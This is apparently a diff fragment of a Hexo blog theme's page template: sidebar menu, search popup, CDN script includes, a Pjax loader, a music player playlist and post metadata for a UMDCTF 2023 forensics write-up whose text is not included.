+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe632;
+        
+      </div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe604;
+        
+      </div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe628;
+        
+      </div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/achievements"
+        aria-label="Achievements"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe621;
+        
+      </div>
+      <div class="sidebar-menu-link">Achievements</div>
+    </div>
+  
+</div>
+
+        </div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div>
+    
+    
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
+  ></script>
+
+
+
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+
+
+
+
+  
+      
+      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+
+
+
+
+
+  
+      
+      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
+      
+
+
+
+  <script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "",
+        apiKey: "",
+        indexName: "",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": "搜索.....",
+          "hits_empty": "未发现与 「${query}」相关内容",
+          "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
+        }
+      }
+    };
+  </script>
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    defer
+    
+    
+    
+    integrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"
+  ></script>
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"
+    defer
+    
+    
+    
+    integrity="sha384-hHJCflT4KBLQyHfKO9vpstIcFKn/Y&#43;KHTORelMMEn7mOp2AVPp&#43;7fr03dLgZiV3J" crossorigin="anonymous"
+  ></script>
+
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/algolia_search.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/mouse-firework@0.1.0/dist/index.umd.js"
+    
+    
+    
+    
+    integrity="sha384-KM6i7tu43nYd6e0beIljxHMC5tZc58XBDu7pPA58w50h18Jsx7gLdimfS09RXlKv" crossorigin="anonymous"
+  ></script>
+
+
+<script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"#ff5252\",\"#ff7c7c\",\"#ffafaf\",\"#ffd0d0\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"#ff0000\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script>
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js"
+    
+    
+    
+    
+    integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE/jMSCxD&#43;jAPU55x/jj3wlf" crossorigin="anonymous"
+  ></script>
+
+
+  <script>
+    function loadScripts(scripts, index) {
+      if (index < scripts.length) {
+        const script = scripts[index];
+        const src = script.getAttribute('src');
+
+        const loadScript = (scriptContent) => {
+          return new Promise((resolve, reject) => {
+            const scriptElement = document.createElement('script');
+            if (script.type) {
+              scriptElement.type = script.type;
+            }
+            if (script.src) {
+              scriptElement.src = script.src;
+              scriptElement.onload = resolve;
+              scriptElement.onerror = reject;
+            }
+            if (scriptContent) {
+              scriptElement.text = scriptContent;
+            }
+            document.head.appendChild(scriptElement);
+            if (!script.src) {
+              resolve();
+            }
+          })
+          
+        }
+
+        ;(src ? loadScript() : loadScript(script.text))
+          .then(() => loadScripts(scripts, index + 1))
+          .catch(error => {
+            console.error(`Failed to load script: ${src || 'inline script'}`, error);
+            loadScripts(scripts, index + 1);
+          });
+      }
+    }
+    window.Pjax &&
+      new window.Pjax({
+        selectors: [
+          "#header>img",
+          "#header>picture",
+          "head title",
+          "#header-title",
+          "#subtitle-wrap",
+          "#main",
+          "#content",
+          ".sidebar-widget",
+          ".sidebar-wrapper",
+          "#mobile-nav",
+          "#lazy-script",
+        ],
+        switches: {
+          "#content": function(oldEl, newEl) {
+            
+            oldEl.className = newEl.className;
+            this.onSwitch();
+          },
+          "#header-title": Pjax.switches.outerHTML,
+          "#subtitle-wrap": Pjax.switches.outerHTML,
+          "#main": function (oldEl, newEl) {
+            const scripts = [...newEl.querySelectorAll("script")];
+            loadScripts(scripts, 0);
+            oldEl.outerHTML = newEl.outerHTML;
+            this.onSwitch();
+          },
+          "#mobile-nav": Pjax.switches.outerHTML,
+          "#lazy-script": function (oldEl, newEl) {
+            const scripts = [...newEl.querySelectorAll("script")];
+            loadScripts(scripts, 0);
+            oldEl.innerHTML = newEl.innerHTML;
+            this.onSwitch();
+          },
+        },
+        cacheBust: false,
+      });
+  </script>
+  
+
+
+
+
+
+  
+      
+      <script src="/js/pjax.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+        
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Spid3r",
+          title: "UMDCTF 2023 | Digital Forensics",
+          url: "https:\/\/sondt1337.github.io\/post\/writeups-forensics-umdctf\/",
+          description: "Writeup 7\/8 digital forensics challs in UMDCTF 2023.",
+          cover: "https:\/\/sondt1337.github.io\/images\/writeups-forensics-umdctf\/featured.png",
+        };
+      </script>
+    
+    
+    
+      
+
+
+
+
+
+  
+      
+      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
+      
+
+      
+      
+      
+      
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;
+
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    
+    
+  </div>
+</div>
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+  
+
+
+
+
+
+  
+       
+         
+      
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js"
+    
+    
+    
+    
+    integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr&#43;h5UfruuRL/aORyw&#43;5&#43;HZoU6e" crossorigin="anonymous"
+  ></script>
+
+
+  
+    <script>
+      const ap = new APlayer({
+          theme: "var(--color-link)",
+          container: document.getElementById('aplayer'),
+          audio: JSON.parse("[{\"artist\":\"Miki Matsubara\",\"cover\":\"/images/song_covers/Mayonaka_no_Door_Stay_With_Me.jpg\",\"lrc\":\"/songs/Mayonaka_no_Door_Stay_With_Me.lrc\",\"name\":\"Mayonaka no Door / Stay With Me\",\"url\":\"/songs/Mayonaka_no_Door_Stay_With_Me.mp3\"},{\"artist\":\"Tomoko Aran\",\"cover\":\"/images/song_covers/Midnight Pretenders.jpg\",\"lrc\":\"/songs/Midnight Pretenders.lrc\",\"name\":\"Midnight Pretenders\",\"url\":\"/songs/Midnight Pretenders.mp3\"},{\"artist\":\"Spectrum\",\"cover\":\"/images/song_covers/F・L・Y.jpg\",\"lrc\":\"/songs/F・L・Y.lrc\",\"name\":\"F・L・Y\",\"url\":\"/songs/F・L・Y.mp3\"},{\"artist\":\"Yoko Oginome\",\"cover\":\"/images/song_covers/LAZY DANCE.jpg\",\"lrc\":\"/songs/LAZY DANCE.lrc\",\"name\":\"LAZY DANCE\",\"url\":\"/songs/LAZY DANCE.mp3\"}]") || [],
+          fixed:  null  || false,
+          autoplay:  false  || false,
+          loop: 'all' || 'all',
+          order: '' || 'list',
+          preload: '' || 'auto',
+          volume:  null  || 0.7,
+          mutex:  null  || true,
+          listFolded:  false  || false,
+          lrcType:  3  || 0,
+      });
+    </script>
+  
+
+
+
+
+
+    
+  </body>
+</html>
